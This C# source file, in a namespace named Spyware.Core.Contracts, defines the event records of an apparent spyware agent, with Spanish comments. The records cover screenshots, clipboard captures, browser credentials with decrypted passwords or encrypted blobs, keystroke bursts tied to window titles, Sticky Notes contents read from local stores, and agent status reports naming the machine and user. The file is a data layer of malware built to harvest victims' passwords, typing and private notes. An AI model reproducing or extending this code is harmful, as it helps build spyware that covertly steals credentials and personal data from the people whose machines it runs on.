namespace Spyware.Core.Contracts;

public sealed record ScreenshotEvent : IAgentEvent
{
    public AgentEventType EventType => AgentEventType.Screenshot;
    public DateTime TimestampUtc { get; init; } = DateTime.UtcNow;

    public required string Path { get; init; }
    public int Width { get; init; }
    public int Height { get; init; }
    public string? Hash { get; init; }
    public long Bytes { get; init; }
    public int DisplayCount { get; init; } = 1;
    public bool DesktopLocked { get; init; }
    public long? DatabaseId { get; init; }
}

public sealed record ClipboardEvent : IAgentEvent
{
    public AgentEventType EventType => AgentEventType.Clipboard;
    public DateTime TimestampUtc { get; init; } = DateTime.UtcNow;

    /// <summary>text | image | html | files</summary>
    public required string Format { get; init; }

    public string? Content { get; init; }
    public string? FilePath { get; init; }
    public long Length { get; init; }
    public string? Hash { get; init; }
    public long? DatabaseId { get; init; }
}

public sealed record CredentialEvent : IAgentEvent
{
    public AgentEventType EventType => AgentEventType.Credential;
    public DateTime TimestampUtc { get; init; } = DateTime.UtcNow;

    public required string Browser { get; init; }
    public required string Profile { get; init; }
    public required string Url { get; init; }
    public string Username { get; init; } = string.Empty;

    /// <summary>Null cuando no fue posible descifrar.</summary>
    public string? Password { get; init; }

    /// <summary>Ver CredentialStatus.</summary>
    public required string Status { get; init; }

    /// <summary>password_value original en base64 (fallback encrypted_only).</summary>
    public string? EncryptedBlobBase64 { get; init; }

    public DateTime? CreatedAt { get; init; }
    public DateTime? LastUsedAt { get; init; }
    public int TimesUsed { get; init; }
    public string? FailureReason { get; init; }
    public long? DatabaseId { get; init; }
}

/// <summary>
/// Ráfaga de pulsaciones: una fila por sesión de escritura (pausa superior a
/// <c>keyboard.idleFlushMilliseconds</c> o cambio de ventana), no por tecla.
/// </summary>
public sealed record KeyEvent : IAgentEvent
{
    public AgentEventType EventType => AgentEventType.Keyboard;
    public DateTime TimestampUtc { get; init; } = DateTime.UtcNow;

    /// <summary>Primera pulsación de la ráfaga.</summary>
    public DateTime StartedUtc { get; init; }

    public required string Text { get; init; }
    public int KeyCount { get; init; }
    public int CharCount { get; init; }
    public bool Truncated { get; init; }

    /// <summary>Ventana en primer plano (T1010); vacío si RecordWindowTitles = false.</summary>
    public string WindowTitle { get; init; } = string.Empty;
    public string ProcessName { get; init; } = string.Empty;

    public string? Hash { get; init; }
    public string? FilePath { get; init; }
    public long? DatabaseId { get; init; }
}

/// <summary>
/// Nota leída de Sticky Notes. Como en las credenciales, el estado separa
/// "pude leer el archivo" de "pude interpretar el contenido".
/// </summary>
public sealed record NoteEvent : IAgentEvent
{
    public AgentEventType EventType => AgentEventType.Note;
    public DateTime TimestampUtc { get; init; } = DateTime.UtcNow;

    /// <summary>"sticky" (plum.sqlite) | "sticky_legacy" (StickyNotes.snt)</summary>
    public required string Source { get; init; }

    /// <summary>Archivo o clave concreta de donde sale la nota.</summary>
    public string Store { get; init; } = string.Empty;

    public string NoteId { get; init; } = string.Empty;

    /// <summary>Null cuando el contenido no se pudo interpretar.</summary>
    public string? Text { get; init; }

    /// <summary>text | html</summary>
    public string Format { get; init; } = "text";

    /// <summary>Ver NoteStatus.</summary>
    public required string Status { get; init; }

    public string? FailureReason { get; init; }
    public int Length { get; init; }
    public string? Hash { get; init; }
    public DateTime? CreatedAt { get; init; }
    public DateTime? UpdatedAt { get; init; }
    public bool Deleted { get; init; }
    public long? DatabaseId { get; init; }
}

public sealed record StatusEvent : IAgentEvent
{
    public AgentEventType EventType => AgentEventType.Status;
    public DateTime TimestampUtc { get; init; } = DateTime.UtcNow;

    public required string AgentId { get; init; }
    public int ProcessId { get; init; }
    public required string MachineName { get; init; }
    public required string UserName { get; init; }
    public required IReadOnlyDictionary<string, object?> Counters { get; init; }
}
